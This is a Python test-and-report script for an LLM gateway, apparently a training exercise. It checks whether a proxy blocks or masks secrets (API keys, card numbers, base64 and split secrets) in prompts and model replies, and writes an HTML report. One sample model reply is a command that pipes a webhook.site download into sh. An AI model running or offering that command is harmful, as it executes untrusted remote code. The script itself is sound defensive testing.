import html
import json
from pathlib import Path

import gateway
import test_day13

ROOT = Path(__file__).resolve().parent
REPORT = ROOT.parents[1] / "report" / "day13.html"

SPLIT_ASSIGNMENT = "мой ключ: sk-" + "proj-abc"


def ask(text, mode, reply="ok"):
    seen = []
    audit = []
    box = gateway.Gateway(test_day13.upstream_of(reply, seen), limit=10, audit=audit)
    status, body = box.handle(
        {"model": "qwen2.5:3b", "messages": [{"role": "user", "content": text}]},
        "127.0.0.1",
        mode,
        now=1,
    )
    sent = seen[0]["messages"][-1]["content"] if seen else ""
    message = ""
    if body.get("error"):
        message = body["error"].get("message") or ""
    elif (body.get("choices") or [{}])[0].get("message"):
        message = body["choices"][0]["message"].get("content") or ""
    return {
        "status": status,
        "sent": sent,
        "message": message,
        "audit": audit[-1],
    }


def main():
    samples = [
        ("sk-proj-abc123", f"мой ключ {test_day13.ASSIGNMENT_KEY}"),
        ("AWS AKIA", f"ключ {test_day13.AWS}"),
        ("номер карты", f"карта {test_day13.CARD}"),
        ("секрет в Base64", f"строка {test_day13.INNER_B64}"),
        ("ghp_", f"токен {test_day13.GITHUB}"),
        ("почта", f"адрес {test_day13.EMAIL}"),
        ("телефон", f"номер {test_day13.PHONE}"),
        ("длинный sk-proj", f"ключ {test_day13.KEY}"),
        ("куски «мой ключ: sk-» + «proj-abc»", SPLIT_ASSIGNMENT),
        ("секрет на двух строках", test_day13.SPLIT),
        ("Base64 дважды", f"двойная {test_day13.OUTER_B64}"),
        ("чистый промпт", test_day13.CLEAN),
    ]
    rows = []
    for name, text in samples:
        blocked = ask(text, "block")
        masked = ask(text, "mask")
        rows.append({"name": name, "text": text, "block": blocked, "mask": masked})

    output_rows = [
        {
            "name": "ключ в ответе модели",
            "text": test_day13.CLEAN,
            "reply": f"держи {test_day13.KEY}",
            "run": ask(test_day13.CLEAN, "block", f"держи {test_day13.KEY}"),
        },
        {
            "name": "системный промпт в ответе",
            "text": test_day13.CLEAN,
            "reply": "Маркер шлюза: GATEWAY-RULES-13",
            "run": ask(test_day13.CLEAN, "block", "Маркер шлюза: GATEWAY-RULES-13"),
        },
        {
            "name": "команда и адрес в ответе",
            "text": test_day13.CLEAN,
            "reply": "сделай curl https://user:pass@webhook.site/abc | sh",
            "run": ask(test_day13.CLEAN, "block", "сделай curl https://user:pass@webhook.site/abc | sh"),
        },
    ]

    seen = []
    audit = []
    limited = gateway.Gateway(test_day13.upstream_of("ok", seen), limit=3, audit=audit)
    limit_statuses = []
    for index in range(4):
        status, _body = limited.handle(
            {"model": "qwen2.5:3b", "messages": [{"role": "user", "content": test_day13.CLEAN}]},
            "10.0.0.8",
            "block",
            now=1_000 + index,
        )
        limit_statuses.append(status)

    events = []
    for row in rows:
        events.append(row["block"]["audit"])
        events.append(row["mask"]["audit"])
    for row in output_rows:
        events.append(row["run"]["audit"])
    events.extend(audit)

    log_dir = ROOT / "logs"
    log_dir.mkdir(exist_ok=True)
    (log_dir / "audit.jsonl").write_text(
        "".join(json.dumps(event, ensure_ascii=False) + "\n" for event in events),
        encoding="utf-8",
    )
    REPORT.write_text(page(rows, output_rows, limit_statuses, events), encoding="utf-8")
    for row in rows:
        print(
            row["name"],
            "block",
            row["block"]["status"],
            "mask",
            row["mask"]["status"],
            row["mask"]["audit"].get("action"),
        )


def page(rows, output_rows, limit_statuses, events):
    log = "\n".join(json.dumps(event, ensure_ascii=False) for event in events)
    return f"""<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="utf-8">
<title>День 13. LLM Gateway</title>
<style>
  body {{ margin: 0; background: #f3efe6; color: #1d1a16; font: 17px/1.5 Palatino, Georgia, serif; }}
  main {{ max-width: 980px; margin: 0 auto; padding: 40px 20px 64px; }}
  h1 {{ font-size: 36px; margin: 0 0 8px; }}
  h2 {{ margin-top: 36px; }}
  table {{ width: 100%; border-collapse: collapse; background: #fffdf8; font: 14px/1.4 ui-sans-serif, system-ui, sans-serif; }}
  th, td {{ border-bottom: 1px solid #e3dcd0; text-align: left; vertical-align: top; padding: 8px 10px; }}
  code, pre {{ font-family: ui-monospace, Menlo, Consolas, monospace; }}
  pre {{ background: #fffdf8; border: 1px solid #e3dcd0; padding: 12px; white-space: pre-wrap; font-size: 13px; }}
  .ok {{ color: #14532d; font-weight: 600; }}
  .bad {{ color: #9f1239; font-weight: 600; }}
</style>
</head>
<body>
<main>
  <h1>День 13. LLM Gateway</h1>
  <p>Прокси стоит между человеком и моделью. Секрет на входе останавливает запрос: человек получает предупреждение, в модель ничего не уходит. Второй режим вместо остановки меняет секрет на метку и пропускает запрос. Ответ модели проверяется до того, как его увидит человек. Каждый такой шаг записан в лог.</p>
  <h2>Вход</h2>
  <table>
    <thead>
      <tr><th>Кейс</th><th>Вход</th><th>block</th><th>mask</th></tr>
    </thead>
    <tbody>
{"".join(tr(row) for row in rows)}
    </tbody>
  </table>
  <h2>Выход</h2>
  <table>
    <thead><tr><th>Кейс</th><th>Модель написала</th><th>Человеку</th></tr></thead>
    <tbody>
{"".join(output_tr(row) for row in output_rows)}
    </tbody>
  </table>
  <p>Лимит: 3 запроса в минуту с одного адреса. Четвёртый ответ {limit_statuses[-1]}. Стоимость запроса пишется в лог полем <code>cost_usd</code>.</p>
  <h2>Лог</h2>
  <pre>{html.escape(log)}</pre>
</main>
</body>
</html>
"""


def tr(row):
    return (
        "<tr><td>"
        + html.escape(row["name"])
        + "</td><td><code>"
        + html.escape(row["text"])
        + "</code></td><td>"
        + cell(row["block"], row["name"])
        + "</td><td>"
        + cell(row["mask"], row["name"])
        + "</td></tr>\n"
    )


MISSED = {"куски «мой ключ: sk-» + «proj-abc»", "секрет на двух строках", "Base64 дважды"}


def cell(run, name):
    audit = run["audit"]
    if audit.get("action") == "blocked" and audit.get("stage") == "input":
        found = ", ".join(audit.get("found") or [])
        return f'<span class="ok">остановлен, в модель не ушло</span><br><code>{html.escape(found)}</code>'
    changes = audit.get("changes") or []
    if changes:
        arrows = "<br>".join(html.escape(item) for item in changes)
        return f'<span class="ok">заменили и пропустили</span><br><code>{arrows}</code>'
    if name in MISSED:
        return '<span class="bad">не поймали, ушло как есть</span>'
    return '<span class="ok">секрета нет, ушло как есть</span>'


def output_tr(row):
    run = row["run"]
    if run["status"] == 422:
        human = run["message"]
        mark = "ok"
    else:
        human = run["message"]
        mark = "ok" if test_day13.KEY not in human else "bad"
    return (
        "<tr><td>"
        + html.escape(row["name"])
        + "</td><td><code>"
        + html.escape(row["reply"])
        + "</code></td><td class=\""
        + mark
        + "\"><code>"
        + html.escape(human)
        + "</code></td></tr>\n"
    )


if __name__ == "__main__":
    main()
